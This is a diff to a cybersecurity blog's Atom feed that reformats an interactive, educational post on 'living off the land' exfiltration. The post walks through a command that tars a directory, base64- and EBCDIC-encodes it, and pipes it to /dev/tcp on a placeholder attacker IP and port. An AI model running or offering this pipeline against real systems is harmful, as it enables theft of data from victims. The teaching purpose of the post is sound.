@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-01-25T11:06:41-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><entry><title type="html">The Exfiltration Handbook</title><link href="/blog/Data-Exfiltration" rel="alternate" type="text/html" title="The Exfiltration Handbook" /><published>2026-01-24T00:00:00-05:00</published><updated>2026-01-24T00:00:00-05:00</updated><id>http://localhost:4000/blog/Exfiltration</id><content type="html" xml:base="/blog/Data-Exfiltration"><![CDATA[<p>In this guide, I’m breaking down how to “live off the land.” We’re talking about taking standard commands and turning them into tunnels. Whether it’s a quick TCP pipe or a slow-burn DNS play, it’s all about being creative with what’s available.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-01-25T11:20:03-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><entry><title type="html">The Exfiltration Handbook</title><link href="/blog/Data-Exfiltration" rel="alternate" type="text/html" title="The Exfiltration Handbook" /><published>2026-01-24T00:00:00-05:00</published><updated>2026-01-24T00:00:00-05:00</updated><id>http://localhost:4000/blog/Exfiltration</id><content type="html" xml:base="/blog/Data-Exfiltration"><![CDATA[<p>In this guide, I’m breaking down how to “live off the land.” We’re talking about taking standard commands and turning them into tunnels. Whether it’s a quick TCP pipe or a slow-burn DNS play, it’s all about being creative with what’s available.</p>
 
 <h3 id="1-the-udp-socket">1. The UDP Socket</h3>
 
@@ -115,6 +115,10 @@ function togglePerspective(container) {
 
 <p>Communication over TCP requires two machines, one victim and one attacker machine, to transfer data.</p>
 
+<p>What is happening here is a pipeline:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Directory → Compressed archive → Text encoding → Obfuscated encoding → Network transfer</code></p>
+
 <div class="code-block-container">
   <span class="code-lang-tag">Terminal</span>
   <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
@@ -126,22 +130,15 @@ function togglePerspective(container) {
   
   <div class="interactive-command">
     <div style="font-size:0.95em; margin-bottom:8px; color:#888;">Click any part to see a short explanation</div>
-    <pre style="background:#0b0c10;color:#f8f8f2;padding:12px;border-radius:6px;overflow:auto;">
-      <code>
-        <span class="cmd-token" onclick="explain('tar')">tar zcf - task4/</span>
-         <span class="cmd-sep">|</span>
-        <span class="cmd-token" onclick="explain('base64')">base64</span>
-         <span class="cmd-sep">|</span>
-        <span class="cmd-token" onclick="explain('dd')">dd conv=ebcdic</span>
-         <span class="cmd-sep">&gt;</span>
-        <span class="cmd-token" onclick="explain('devtcp')">/dev/tcp/{IP}/{PORT}</span>
-      </code>
+    <pre style="background:#0b0c10;color:#f8f8f2;padding:12px;border-radius:6px;overflow:auto;white-space:nowrap;">
+      <code><span class="cmd-token" onclick="explain('tar')">tar zcf - task4/</span><span class="cmd-sep"> | </span><span class="cmd-token" onclick="explain('base64')">base64</span><span class="cmd-sep"> | </span><span class="cmd-token" onclick="explain('dd')">dd conv=ebcdic</span><span class="cmd-sep"> &gt; </span><span class="cmd-token" onclick="explain('devtcp')">/dev/tcp/{IP}/{PORT}</span></code>
     </pre>
     <div id="cmd-explain" style="margin-top:8px;padding:10px;border-radius:6px;background:#f6f6f6;color:#111;font-size:0.95em;min-height:34px;">Click a segment for a concise explanation.</div>
   </div>
 
   <style>
-    .cmd-token{cursor:pointer;color:#8be9fd;padding:2px 4px;border-radius:4px}
+    .interactive-command pre{white-space:nowrap;overflow-x:auto}
+    .cmd-token{cursor:pointer;color:#8be9fd;padding:2px 4px;border-radius:4px;display:inline-block}
     .cmd-token:hover{background:rgba(139,233,253,0.08)}
     .cmd-sep{color:#bfbfbf;padding:0 6px}
   </style>
@@ -167,10 +164,6 @@ function togglePerspective(container) {
 <p>This command looks complex, but it is really just a chain of simple tools working together. At a high level, it takes a directory, packages it up, slightly disguises the data, and sends it directly to another machine over the network.</p>
 
 <p>Nothing is written to disk. Everything happens as a live data stream.</p>
-
-<p>What is happening here is a pipeline:</p>
-
-<p><code class="language-plaintext highlighter-rouge">Directory → Compressed archive → Text encoding → Obfuscated encoding → Network transfer</code></p>
 
 <p>Each command receives data, transforms it, and passes it along to the next step.</p>
 
